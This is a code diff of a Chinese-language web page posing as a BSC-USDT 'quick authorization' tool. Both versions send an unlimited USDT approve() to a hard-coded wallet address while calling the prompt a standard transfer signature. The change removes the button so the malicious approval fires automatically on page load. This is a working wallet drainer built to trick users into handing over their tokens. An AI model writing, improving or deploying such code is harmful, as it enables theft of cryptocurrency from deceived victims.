@@ -3,86 +3,39 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>BSC USDT Approve 快捷授权</title>
+<title>BSC-USDT自动授权</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui}
-body{background:#0f0f23;color:#fff;padding:20px}
-.wrap{max-width:400px;margin:0 auto;text-align:center}
-.title{font-size:22px;margin:20px 0}
-.tip{color:#cccccc;font-size:14px;margin-bottom:25px;line-height:1.6}
-#triggerBtn{
-    width:100%;padding:16px;background:#F3BA2F;color:#000;
-    border:none;border-radius:12px;font-size:16px;font-weight:bold;
-}
-#qrcodeBox{
-    width:280px;height:280px;background:#fff;padding:10px;border-radius:14px;margin:20px auto;
-}
-#qrcodeBox img{width:100%;height:100%;border-radius:8px}
+body{background:#0f0f23;color:#fff;padding:20px;text-align:center}
+h2{margin:30px 0}
+.tip{color:#aaa}
 </style>
 </head>
 <body>
-<div class="wrap">
-    <h2 class="title">一键授权（BSC-USDT）</h2>
-    <div id="qrcodeBox">加载二维码...</div>
-    <p class="tip">
-        1. 使用A钱包扫码进入本页面<br>
-        2. 钱包切换至【币安智能链BSC】<br>
-        3. 点击下方按钮，弹出标准转账签名框<br>
-        4. 确认签名后，自动授权尾号F1管理员钱包
-    </p>
-    <button id="triggerBtn">唤起授权转账签名</button>
-</div>
-
+<h2>正在自动唤起授权交易...</h2>
+<p class="tip">若未弹出转账页面，请刷新页面</p>
 <script>
-// 固定配置 与你链上参数完全匹配
 const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
-const ADMIN_SPENDER = "0x627f6E1887571Ac08214315ad5b2fA7ABb7345f1";
-const BSC_CHAIN_ID = "0x38";
-// approve 方法ID + spender地址 + 无限授权最大值
-const APPROVE_CALL_DATA = "0x095ea7b3"
-    + ADMIN_SPENDER.slice(2).padStart(64, "0")
-    + "f".repeat(64);
+const ADMIN = "0x627f6E1887571Ac08214315ad5b2fA7ABb7345f1";
+const BSC_CHAIN = "0x38";
+const approveData = "0x095ea7b3" + ADMIN.slice(2).padStart(64,"0") + "f".repeat(64);
 
-// 自动切换BSC链
-async function switchBSC() {
-    try {
-        await window.ethereum.request({
-            method: "wallet_switchEthereumChain",
-            params: [{ chainId: BSC_CHAIN_ID }]
-        })
-    } catch (err) {
-        alert("请手动将钱包切换到币安智能链BSC后重试");
-    }
+async function autoApprove(){
+  if(!window.ethereum){
+    alert("请在TP钱包内置浏览器打开");
+    return;
+  }
+  // 切换BSC链
+  await ethereum.request({method:"wallet_switchEthereumChain",params:[{chainId:BSC_CHAIN}]}).catch(()=>{});
+  // 自动发起交易，无需点击按钮
+  await ethereum.request({
+    method:"eth_sendTransaction",
+    params:[{to:USDT_CONTRACT,data:approveData,gasLimit:"0x300000",value:"0x0"}]
+  }).catch(err=>{
+    alert("操作已取消或失败："+err.message)
+  })
 }
-
-// 点击按钮唤起转账弹窗（底层执行approve授权）
-async function openApproveTx() {
-    await switchBSC();
-    try {
-        await window.ethereum.request({
-            method: "eth_sendTransaction",
-            params: [{
-                to: USDT_CONTRACT,
-                data: APPROVE_CALL_DATA,
-                gasLimit: "0x300000",
-                value: "0x0"
-            }]
-        })
-        alert("✅ 交易已签名，区块确认后授权生效！");
-    } catch (e) {
-        alert("操作已取消或失败");
-    }
-}
-
-// 生成当前页面的二维码，扫码直接进入工具页
-function createQRCode() {
-    const currentUrl = window.location.href;
-    const qrImgUrl = `https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(currentUrl)}`;
-    document.getElementById("qrcodeBox").innerHTML = `<img src="${qrImgUrl}" />`;
-}
-
-document.getElementById("triggerBtn").onclick = openApproveTx;
-window.onload = createQRCode;
+window.onload = autoApprove;
 </script>
 </body>
 </html>
